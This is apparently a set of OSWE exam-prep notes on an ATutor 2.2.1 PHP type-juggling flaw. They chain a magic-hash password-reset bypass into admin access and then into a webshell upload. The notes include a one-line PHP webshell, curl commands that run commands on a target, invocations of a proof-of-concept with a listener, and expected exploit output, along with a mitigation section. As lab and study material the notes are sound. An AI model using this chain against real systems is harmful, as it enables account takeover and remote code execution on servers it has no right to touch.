# ATutor Type Juggling PoC Notes

## Vulnerability Summary
- **Target**: ATutor LMS <= 2.2.1
- **CVE**: SRC-2016-0012
- **Type**: PHP Type Juggling in Authentication
- **Impact**: Authentication Bypass → Admin Access → RCE

## Vulnerability Details

### Root Cause
ATutor uses **loose comparison (`==`)** instead of **strict comparison (`===`)** when validating password reset tokens.

```php
// Vulnerable code (simplified):
if ($user_provided_token == $database_token) {
    // Allow password reset
}
```

### Magic Hashes
In PHP, strings starting with `0e` followed by only digits are interpreted as scientific notation in loose comparisons:

```php
"0e123456789" == "0e987654321"  // TRUE (both equal 0)
"0e123456789" == 0               // TRUE
"240610708" MD5 = "0e462097431906509019562988736854"
```

### Exploitation
1. Request password reset for admin
2. Provide a magic hash string as the reset token
3. If the real token also happens to be a magic hash (or we can manipulate it), the loose comparison succeeds
4. Reset admin password
5. Login as admin
6. Upload PHP webshell via file manager
7. Execute commands

## Lab Setup

### Installation
```bash
# Download ATutor 2.2.1
wget https://sourceforge.net/projects/atutor/files/atutor_2_2_1/ATutor_2_2_1.zip

# Extract and configure
unzip ATutor_2_2_1.zip
# Follow installation wizard
# Default admin: admin / admin
```

### Configuration
- Web Server: Apache with PHP 5.x
- Database: MySQL
- Default URL: http://localhost/ATutor
- Admin Panel: http://localhost/ATutor/admin

## Exploit Chain

### Stage 1: Reconnaissance
```bash
curl http://<target>/login.php | grep ATutor
```

### Stage 2: User Registration
Create a test account to understand the application flow.

### Stage 3: Type Juggling
```python
# Magic hash values
magic_hashes = {
    "240610708": "0e462097431906509019562988736854",
    "QNKCDZO": "0e830400451993494058024219903391",
    "s878926199a": "0e545993274517709034328855841020",
}
```

### Stage 4: Admin Login
Login with reset password to gain admin privileges.

### Stage 5: Shell Upload
Upload PHP webshell through admin file manager:
```php
<?php system($_REQUEST['cmd']); ?>
```

### Stage 6: RCE Verification
```bash
curl "http://<target>/shell.php?cmd=whoami"
```

## Testing Commands

```bash
# Basic exploitation
python3 poc.py --target-ip 192.168.1.100

# With Burp Suite proxy
python3 poc.py --target-ip 192.168.1.100 --proxy http://127.0.0.1:8080

# Custom listener
python3 poc.py --target-ip 192.168.1.100 --listening-ip 10.10.14.5 --listening-port 4444
```

## Expected Behavior

### Successful Exploitation
```
[+] ATutor installation confirmed
[+] User registration successful
[+] Type juggling successful! Admin password reset
[+] Successfully authenticated as admin
[+] Webshell uploaded successfully!
[+] Shell URL: http://target/content/shell.php
[+] RCE Confirmed!
```

## Debugging

### If Registration Fails
- Check if registration is open: Admin > Configuration > User Registration
- Try different username/email combinations
- Verify email doesn't need confirmation

### If Type Juggling Fails
- Manually inspect password reset flow
- Try different magic hashes
- Check if strict comparison was patched

### If Upload Fails
- Check file manager permissions
- Try different upload paths
- Verify PHP execution is enabled

## Mitigation

### Developer Fix
```php
// Before (vulnerable):
if ($user_token == $reset_token) { }

// After (secure):
if ($user_token === $reset_token) { }
// Or better: use hash_equals()
if (hash_equals($user_token, $reset_token)) { }
```

## References
- https://srcincite.io/advisories/src-2016-0012/
- https://github.com/sourceincite/poc/blob/master/SRC-2016-0012.py
- https://www.whitehatsec.com/blog/magic-hashes/
- https://www.php.net/manual/en/language.operators.comparison.php

## OSWE Exam Notes

### Key Takeaways
1. Always check for loose vs strict comparisons in source code
2. Magic hashes are a real attack vector in PHP
3. Type juggling can bypass authentication, authorization, and comparison checks
4. Chain multiple vulnerabilities: bypass → access → file upload → RCE

### Time Management
- Reconnaissance: 5 min
- Registration: 5 min
- Type juggling: 10 min
- Admin login: 5 min
- Shell upload: 10 min
- Total: ~35 minutes

### Common Pitfalls
1. Forgetting to use strict comparison in your own validation code
2. Not testing all magic hash variants
3. Assuming loose comparison is always exploitable (need both sides to be magic hashes)
4. Missing file upload locations in different versions
